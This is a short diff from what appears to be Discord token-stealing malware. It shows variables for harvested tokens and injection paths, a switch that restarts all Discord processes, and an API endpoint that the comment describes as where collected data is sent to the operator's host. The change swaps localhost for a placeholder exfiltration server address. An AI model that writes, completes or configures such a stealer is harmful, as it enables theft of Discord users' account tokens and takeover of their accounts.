@@ -10,7 +10,7 @@ let tokens = [],
     injectPath = [],
 
     killdcop = false, //(true) to restart all Discord processes, (false) for the opposite.
-    API = "http://localhost:3000/request" // here you need to add your (api) so that the recommendation data can be sent to host in replit lol
+    API = "http://addyourpiserver/request" // here you need to add your (api) so that the recommendation data can be sent to host in replit lol
     
 switch (process.platform) {
     case "win32":
